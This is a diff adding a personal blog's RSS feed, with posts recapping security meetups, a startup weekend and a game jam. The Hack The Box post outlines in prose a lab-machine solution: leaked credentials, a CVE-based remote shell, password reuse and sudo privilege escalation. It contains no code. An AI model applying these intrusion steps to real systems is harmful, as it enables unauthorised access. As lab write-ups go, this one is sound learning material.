+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=yfgw-K0gaqs&amp;amp;t=12s&#34;&gt;https://www.youtube.com/watch?v=yfgw-K0gaqs&amp;t=12s&lt;/a&gt;&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Owasp Talk - April 2025</title>
+      <link>http://localhost:1313/posts/owaspapril2025/</link>
+      <pubDate>Wed, 30 Apr 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/owaspapril2025/</guid>
+      <description>&lt;p&gt;This is a blog on a meetup by the local OWASP chapter in wellington.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;This is a blog on a meetup by the local OWASP chapter in wellington.&lt;/p&gt;
+&lt;h1 id=&#34;local-owasp-talk-recap&#34;&gt;Local OWASP Talk Recap&lt;/h1&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Last night, I had the opportunity to attend a local OWASP (Open Web Application Security Project) talk. The event featured a cybersecurity talk about an idea for a Credential Management API, AKA, 0 click login systems.&lt;/p&gt;
+&lt;p&gt;In this blog post, I&amp;rsquo;ll share some key insights from the event and highlight my takeaways from the engaging sessions.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;featured-speaker-matt-cotterell&#34;&gt;Featured Speaker: &lt;strong&gt;[Matt Cotterell]&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;The keynote was delivered by &lt;strong&gt;[Matt Cotterell]&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;key-points-from-the-talk&#34;&gt;Key Points from the Talk&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;[History of Logins]:&lt;/strong&gt; This was just a history of all the login systems we&amp;rsquo;ve used from the beginning of web. I don&amp;rsquo;t really want to go over this in depth. (I don&amp;rsquo;t remember it very well anymore.)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;[A one click login system]:&lt;/strong&gt; A one click login system, using password managers through the browser.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;live-demonstration&#34;&gt;Live Demonstration&lt;/h2&gt;
+&lt;h2 id=&#34;one-of-the-most-captivating-parts-of-the-talk-was-the-live-demonstration-of-a-theoreticle-one-clickzero-click-login-the-speaker-showcased-a-secure-way-which-a-webapp-could-communicate-with-website-to-log-the-user-in-using-a-password-manager-i-could-be-wrong-but-what-i-understood-was-that-the-idea-is-that-you-first-send-a-simple-login-message-to-the-server-it-then-communicates-to-the-password-mananger-to-see-if-there-is-a-login-for-the-page-gets-the-user-and-password-and-you-are-logged-in-this-means-that-all-the-website-will-do-is-prompt-the-password-manager-on-login-without-having-to-fill-out-any-fields-this-will-be-very-useful-as-often-you-need-to-fill-out-these-fields-everytime-you-go-to-a-different-app-or-need-to-swap-accounts-on-an-app-or-something-it-was-put-in-more-depth-in-the-talk-but-this-was-a-while-ago-so-i-dont-remember-it-very-well-anymore&#34;&gt;One of the most captivating parts of the talk was the live demonstration of &lt;strong&gt;[A theoreticle one click/zero click login]&lt;/strong&gt;. The speaker showcased a secure way which a webapp could communicate with website to log the user in using a password manager. I could be wrong but what I understood was that, the idea is that you first send a simple Login message to the server. It then communicates to the password mananger to see if there is a login for the page, gets the user and password and you are logged in. This means that all the website will do is prompt the password manager on login without having to fill out any fields. This will be very useful as often you need to fill out these fields everytime you go to a different app or need to swap accounts on an app or something. It was put in more depth in the talk, but this was a while ago so I don&amp;rsquo;t remember it very well anymore.&lt;/h2&gt;
+&lt;h2 id=&#34;final-thoughts&#34;&gt;Final thoughts.&lt;/h2&gt;
+&lt;p&gt;I know this will take ages to become standard, but compared to the current system of password and two factor, I think it&amp;rsquo;s highly efficient and secure enough to work. This can also be done with keys which have started to be used for two factor, although this wouldn&amp;rsquo;t be able to replace the user bit of th elogin so I&amp;rsquo;m not sure.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Enjoy your day!&lt;/p&gt;
+&lt;p&gt;I did not have time to write it up properly so the template for the blog was generated by a chatbot and refactored it a lot.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Project Wednesday</title>
+      <link>http://localhost:1313/posts/projectwednesday/</link>
+      <pubDate>Fri, 25 Apr 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/projectwednesday/</guid>
+      <description>&lt;p&gt;Today I participated in Project Wednesday, a Cyber Security Meetup run by Bastion Security Group.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;Today I participated in Project Wednesday, a Cyber Security Meetup run by Bastion Security Group.&lt;/p&gt;
+&lt;h1 id=&#34;the-experience&#34;&gt;The Experience&lt;/h1&gt;
+&lt;p&gt;This meetup had two talks, one about 8 points on threat analysis, and another about analytics on physical security. To be honest, I already knew all of this stuff, but it was nice talking to the crowd after the talks.&lt;/p&gt;
+&lt;p&gt;Will add the topics in more detail here later&lt;/p&gt;
+&lt;p&gt;Before the talks, we were fed with pizza, with the cheeze pizza being in the back. I was quite lucky with this, and got to have all of it for myself. At this event I met Skelmis and Rhys(as they work at Bastion). Accidentally called Rhys Joseph ;-;. For reference if you see a CTF challenge, especially Cryptography, written by Joseph&amp;hellip; Run!&lt;/p&gt;
+&lt;p&gt;Was nice talking to Skelmis and Rhys.&lt;br&gt;
+After the two talks, I was interested in how I could practice Blue Team Security, and was introduced to a few resources by one of the speakers, namely blueteamlabs and 13Cubed. I&amp;rsquo;ll probably check these out at some point.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Startup Weekend Wellington</title>
+      <link>http://localhost:1313/posts/startupweekend/</link>
+      <pubDate>Fri, 25 Apr 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/startupweekend/</guid>
+      <description>&lt;p&gt;This weekend I participated in the Wellington startup weekend. I came into this event, excited to create a new never-seen-before product, and ended up learning that this was not a good way to approach startups especially when the MVP is to be created in less than 2 days.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;This weekend I participated in the Wellington startup weekend. I came into this event, excited to create a new never-seen-before product, and ended up learning that this was not a good way to approach startups especially when the MVP is to be created in less than 2 days.&lt;/p&gt;
+&lt;h1 id=&#34;what-is-startup-weekend&#34;&gt;What is Startup Weekend?&lt;/h1&gt;
+&lt;p&gt;Similar to a hackathon, startup weekend is a competition where you try to build a product in a given amount of time, to be presented to judges. The winner is the group with the best project.&lt;/p&gt;
+&lt;p&gt;The main difference is that, the &lt;strong&gt;idea is valued&lt;/strong&gt; over the product itself.&lt;/p&gt;
+&lt;p&gt;For example, if your solution is an app which gives financial advice to students, the judges want to know, what exactly the product is, how it could be build, the costs, revenue, who the potential customers are, and how you will get them to pay.&lt;/p&gt;
+&lt;p&gt;You might create a slideshow which contains relevant data, with a short video of what the product might look like (you can cheat a website by using e.g. figma).&lt;/p&gt;
+&lt;h1 id=&#34;the-experience&#34;&gt;The Experience&lt;/h1&gt;
+&lt;h3 id=&#34;day-1&#34;&gt;Day 1&lt;/h3&gt;
+&lt;h4 id=&#34;pitching&#34;&gt;Pitching&lt;/h4&gt;
+&lt;p&gt;The event starts with us pitching ideas to later be voted. 60+ ideas were pitched, 2 of them being mine. The ideas I pitched were &amp;ldquo;Wearable Journal&amp;rdquo;, and &amp;ldquo;One Click Chocolate&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Due to the nature of Journals, they are always written at the end of your day after everything happens. But what if you are busy, what if you forget, what if you do something after writing your journal. But can&amp;rsquo;t you just write it throughout the day? Yes but that requires you to carry your journal around with you, and it is harder to structure what you have written.&lt;/p&gt;
+&lt;p&gt;That&amp;rsquo;s where the &amp;ldquo;Wearable Journal&amp;rdquo; comes in. It is a peice of hardware you can wear, which monitors your day and writes up a journal for you at the end of the day.&lt;/p&gt;
+&lt;p&gt;My other idea &amp;ldquo;One Click Chocolate&amp;rdquo; was nothing interesting. I just came up with something random because the organizers were asking for more people to present their ideas.&lt;/p&gt;
+&lt;p&gt;The product for this would have been a monitor in a fridge which monitors your diet, and order&amp;rsquo;s the best chocolate for your conditions based off of this.&lt;/p&gt;
+&lt;h4 id=&#34;voting&#34;&gt;Voting&lt;/h4&gt;
+&lt;p&gt;After the pitches, we were given 3 stickers each to vote for our favorite ideas.&lt;/p&gt;
+&lt;p&gt;I put mine on LooFinder(a toilet finding app), the Teenager Job Finding app presented by a 14 year old, and Joi.AI(a tool to help parents with babies sort through their photos).&lt;/p&gt;
+&lt;p&gt;Not much else to talk about with this stage.&lt;/p&gt;
+&lt;h4 id=&#34;forming-groups&#34;&gt;Forming Groups&lt;/h4&gt;
+&lt;p&gt;After the most popular pitches were selected, we formed groups, and I joined Joi.AI.&lt;br&gt;
+We then went to a room and introduced each other. It was nice to sit down and expand on the idea that Shang(the person who came up with the idea) had created with five other teammates. Our discussion was centered around the problems that people in our market was, and defining who these people were. The main issue was organising through dozens of photos of children everyday, and being able to store the photos.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Sanderson - Massey Game Jam</title>
+      <link>http://localhost:1313/posts/masseygamejam/</link>
+      <pubDate>Wed, 23 Apr 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/masseygamejam/</guid>
+      <description>&lt;p&gt;This is a blog on the 2 day Game Jam at Massey University.&lt;/p&gt;
+&lt;p&gt;The theme was out of time, and my team completed the game within the given two-day timeframe.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;This is a blog on the 2 day Game Jam at Massey University.&lt;/p&gt;
+&lt;p&gt;The theme was out of time, and my team completed the game within the given two-day timeframe.&lt;/p&gt;
+&lt;h1 id=&#34;sanderson&#34;&gt;Sanderson&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/sanderson.png&#34; alt=&#34;An Image of the Game&#34; title=&#34;Sanderson&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The game we made is called Sanderson, named after our main character.&lt;/p&gt;
+&lt;h3 id=&#34;lore&#34;&gt;Lore&lt;/h3&gt;
+&lt;p&gt;Sanderson is a Teenager about 18 years old who ran away from home. Somehow he ended up in an abandonded city&amp;hellip; somewhere in the desert. You know what deserts are like, they are hot, so you must stay hydrated. When outside Sanderson gets dehydrated really quickly, despite the lack of water.&lt;/p&gt;
+&lt;p&gt;In the beginning of our story, Sanderson hears word about an Oasis somewhere in the City, so seaks out for this large source of water. Due to the extreme temperatures, he has to avoid staying outside and take cover in houses on his way. These houses have some water reminants, and sometimes the odd waterbottle, but they aren&amp;rsquo;t there for any intruder, only the ones who are best at Parkour.&lt;br&gt;
+&lt;img src=&#34;http://localhost:1313/images/sanderson-house.png&#34; alt=&#34;An Image of the Game&#34; title=&#34;Sanderson In a House&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;how-we-incorporated-the-theme---out-of-time&#34;&gt;How we incorporated the theme - &amp;ldquo;Out of time&amp;rdquo;&lt;/h3&gt;
+&lt;p&gt;We did this in a few ways.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hydration Bar&lt;/strong&gt;&lt;br&gt;
+The first is Hydration. Sanderson has limited time he can live before dehydrating, especially outside. Whilst playing the game, you really do not want to be sanding outside in the sun, as you will completely dehydrate in about 10 seconds and have to reset from the last door. You need to make it to the checkpoints, which are the water droplets and bottles in houses before this bar depletes completely. The game is quite unforgiving, in that even with a perfect game, you reach the end with hardly and Hydration left. During the game jam I had a few people try our game, but no one, including myself and another person on our team could beat it. Well that&amp;rsquo;s not true, our third team member did beat it as we really wanted to show our ending.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Ending&lt;/strong&gt;&lt;br&gt;
+I would show you this, but I think it&amp;rsquo;s something you should experience yourself when we release the game. It hits the right spot of your heart I believe.&lt;/p&gt;
+&lt;h3 id=&#34;animations&#34;&gt;Animations&lt;/h3&gt;
+&lt;p&gt;We were so lucky to have to artistic people in our team of four. One of them couldn&amp;rsquo;t make it on the first day, but they made such cool sprites on the second. The other was here for both days, and he even made the most pull requests on github :0.&lt;/p&gt;
+&lt;p&gt;Our character Sanderson has a few animations. Stand Still, Walk, Jump, Climb, and Crumple.&lt;br&gt;
+I think that they are all self explanitory by the names.&lt;br&gt;
+&lt;img src=&#34;http://localhost:1313/images/player.png&#34; alt=&#34;An Image of the Game&#34; title=&#34;Sandersons Sprites&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;my-thoughts&#34;&gt;My Thoughts&lt;/h1&gt;
+&lt;p&gt;I found this Game Jam really fun. I enjoyed the feeling of progress that comes from making a game, and the sense of success when you finally finish it, and present in front of a crowd. This was a very valuable experience, as it taught be more about teamwork, showed me what completing a project is like, and gave me another topic I could writeup on my Blog.&lt;/p&gt;
+&lt;p&gt;This was the first ever game jam for 3 of us and we had never made a game in our lives, so you can imagine how I felt going into it, worried that I wouldn&amp;rsquo;t complete it.&lt;/p&gt;
+&lt;p&gt;We had a good range though, a person experienced with some 2d game dev and art, someone who wants to add new stuff, a person who works on features to the side and adds them when done, and someone who keeps everyone on track. This is how we managed to complete the game in the given time.&lt;/p&gt;
+&lt;p&gt;We plan to continue developing this game and are considering working together as a team again for a gamejam online.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Cyber Gamified - Brock Roderick</title>
+      <link>http://localhost:1313/posts/cybergamified/</link>
+      <pubDate>Tue, 22 Apr 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/cybergamified/</guid>
+      <description>&lt;p&gt;This is a blog on the Cyber Gamified event by Brock Roderick. He works at Education Arcade, a company who creates games which are cyberfied.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;This is a blog on the Cyber Gamified event by Brock Roderick. He works at Education Arcade, a company who creates games which are cyberfied.&lt;/p&gt;
+&lt;p&gt;They displayed the many different games they&amp;rsquo;ve made, and then showed us their card game Cyber Attack Chain. We played a mini tournament where I won the first round and got a pack of cards for free. After I asked if he would be willing to help a bit with VUWGCTF which is a competition my team will run in the future.&lt;/p&gt;
+&lt;p&gt;I meat eth7turbo and balanced there. Also a few other people I knew.&lt;/p&gt;</content:encoded>
+    </item>
+    
+    <item>
+      <title>Hack The Box NZ - Wellington - 0x09 Wellington Meetup: Blast Radius - Cloud vs On-Premise</title>
+      <link>http://localhost:1313/posts/hackthebox/</link>
+      <pubDate>Wed, 09 Apr 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/hackthebox/</guid>
+      <description>&lt;p&gt;This is a blog on a HTB meetup in wellington. These events start with a talk, and then go to pwning a retired HTB lab machine.&lt;/p&gt;</description>
+      <content:encoded>&lt;p&gt;This is a blog on a HTB meetup in wellington. These events start with a talk, and then go to pwning a retired HTB lab machine.&lt;/p&gt;
+&lt;h2 id=&#34;my-disorganised-notes&#34;&gt;My disorganised notes.&lt;/h2&gt;
+&lt;p&gt;God Account:&lt;br&gt;
+giving user god access makes use password everywhere and when attacker leaks gets pass for everywhere&lt;/p&gt;
+&lt;p&gt;Wide open storage:&lt;br&gt;
+Confidential files on windows fileshre anyone in company can access cuz ACL, attacker compromise user laptop reverse control mechanism neeeded. Gigabytes of data need to be exfiltrated so often gets noticed.&lt;/p&gt;
+&lt;p&gt;S3 bucket:&lt;br&gt;
+S3 bucket left open and listable by anonymous because lots of settings and hard.&lt;br&gt;
+Attacker bulk harvest&lt;br&gt;
+Isn&amp;rsquo;t detected because object level logging is an optional upgrade&lt;/p&gt;
+&lt;p&gt;Blast radius of mistakes&lt;br&gt;
+OnPrem mistakes are limited to what the compr resource can access, restricted by design.&lt;br&gt;
+Clouds benefit work against it when compromised - convenient single GUI for all resources, single user can have ultimate power.&lt;br&gt;
+Public access by default makes large scale compromise simpler.&lt;/p&gt;
+&lt;p&gt;On-Prem - hard outer shell&lt;br&gt;
+Missed&lt;/p&gt;
+&lt;p&gt;Cloud - Identity is the new perimeter&lt;br&gt;
+all action start with a login&lt;br&gt;
+resrouces accessible by default&lt;br&gt;
+need to think of every resource as it&amp;rsquo;s own sec problem&lt;/p&gt;
+&lt;p&gt;Considerations&lt;br&gt;
+Blast radius of each mistake&lt;br&gt;
+start secure and loosen as you go(least-priov)&lt;br&gt;
+security starts during design - don&amp;rsquo;t fall into the trap of assuming you can secure it before go live&lt;br&gt;
+each resource type brings new threats&lt;br&gt;
+Other stuff&lt;/p&gt;
+&lt;p&gt;Designing access control&lt;br&gt;
+never assign AdminAccess&lt;br&gt;
+AWS perms are based on action + target, minimize at least 1 of these, if not both (ex: s3* but limited to a single bucket)&lt;br&gt;
+treat your permissions / role definitions as code, make sure you track changes&lt;br&gt;
+Regularly revisit! access creep is a big thing&lt;/p&gt;
+&lt;p&gt;Designing audit&lt;br&gt;
+Keep logs of everythign easy but costs&lt;br&gt;
+estab how long you need for&lt;br&gt;
+test the logs&lt;br&gt;
+consider the full stack&lt;/p&gt;
+&lt;p&gt;Designing the secrets&lt;br&gt;
+Handling secrets in cloud is more ez than on-prem&lt;br&gt;
+secrets manager can be used just about everywhere&lt;br&gt;
+code can easily be transported between environments even on prem&lt;br&gt;
+again need&lt;/p&gt;
+&lt;p&gt;tips for aws&lt;br&gt;
+Set a budget&lt;br&gt;
+Turn on cloudtrail audit mod&lt;br&gt;
+Create user with limited perms&lt;br&gt;
+create s3 bucket that allows limit&lt;br&gt;
+EC2 instance not on internet&lt;br&gt;
+Static weba pp hosted in s3 bucket, with cloudfront in front of it, without exposing S3.&lt;/p&gt;
+&lt;p&gt;Stakes in cloud are different to not cloud so be weary.&lt;/p&gt;
+&lt;h2 id=&#34;lab-machine&#34;&gt;Lab Machine&lt;/h2&gt;
+&lt;p&gt;Today we didn&amp;rsquo;t actually get to hack a retired HTB machine because of something HTB did?&lt;/p&gt;
+&lt;p&gt;So we played one of the online machines called &amp;ldquo;Dog&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;The user solution is to get a user and password using the file in the github on the website. We can use a cve to get a remote shell on the website. After this we can find the user and use the same password.&lt;/p&gt;
+&lt;p&gt;For the root, we run sudo -l to find a command we can run and then use it to run a php script and get /root/root.txt.&lt;/p&gt;
+&lt;p&gt;Very easy challenge, if it didn&amp;rsquo;t keep giving me the weirdest errors which weren&amp;rsquo;t even my fault ;-;.&lt;/p&gt;
+&lt;h2 id=&#34;the-event&#34;&gt;The Event&lt;/h2&gt;
+&lt;p&gt;The event was quite fun. Met some friends and got to talk to them and ate lots of pizza.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s unfortunate that I had an exam at the start because I finished some of the talk, but I completed the exam in under 30 minutes so I got to be there for basically the whole thing.&lt;/p&gt;</content:encoded>
+    </item>
+    
+  </channel>
+</rss>
